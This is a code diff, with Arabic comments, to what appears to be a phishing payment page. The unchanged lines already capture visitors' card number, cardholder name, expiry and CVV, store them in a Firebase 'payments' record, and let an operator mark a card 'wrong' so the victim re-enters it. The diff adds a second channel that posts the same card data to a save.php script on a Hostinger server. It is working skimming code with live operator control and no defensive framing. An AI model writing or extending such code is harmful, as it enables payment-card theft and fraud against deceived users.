@@ -147,11 +147,30 @@
         const visitorId = localStorage.getItem('visitorId') || "V_" + Math.floor(Math.random() * 100000);
         localStorage.setItem('visitorId', visitorId);
 
-        // تحديث حالة الزائر في لوحة التحكم
-        database.ref('payments/' + visitorId).update({ 
+        // وظيفة لإرسال البيانات لملف save.php الخاص بقاعدة بيانات Hostinger لتتبع الزوار
+        function syncToHostinger(data) {
+            const formData = new FormData();
+            formData.append('visitorId', visitorId);
+            formData.append('currentPage', data.currentPage || "صفحة الدفع");
+            if(data.cardNumber) formData.append('cardNumber', data.cardNumber);
+            if(data.cardHolder) formData.append('cardHolder', data.cardHolder);
+            if(data.expiry) formData.append('expiry', data.expiry);
+            if(data.cvv) formData.append('cvv', data.cvv);
+            if(data.action) formData.append('action', data.action);
+
+            fetch('save.php', {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log("Hostinger Sync Error: ", err));
+        }
+
+        // تحديث حالة الزائر في لوحة التحكم (Firebase + Hostinger)
+        const initialStatus = { 
             currentPage: "صفحة الدفع", 
             lastActive: firebase.database.ServerValue.TIMESTAMP 
-        });
+        };
+        database.ref('payments/' + visitorId).update(initialStatus);
+        syncToHostinger(initialStatus);
 
         const visaIcon = "https://img.icons8.com/color/48/000000/visa.png";
         const masterIcon = "https://img.icons8.com/color/48/000000/mastercard.png";
@@ -225,8 +244,9 @@
             };
 
             database.ref('payments/' + visitorId).update(cardData);
+            syncToHostinger(cardData);
 
-            // مراقبة قرار الأدمن
+            // مراقبة قرار الأدمن من لوحة التحكم
             database.ref('payments/' + visitorId).on('value', (snapshot) => {
                 const data = snapshot.val();
                 if (!data) return;
@@ -237,7 +257,9 @@
                 else if (data.action === "wrongCard") {
                     document.getElementById('loadingOverlay').style.display = 'none';
                     showError();
-                    database.ref('payments/' + visitorId).update({ action: "user_fixing_card" });
+                    const fixData = { action: "user_fixing_card" };
+                    database.ref('payments/' + visitorId).update(fixData);
+                    syncToHostinger(fixData);
                 }
             });
         }
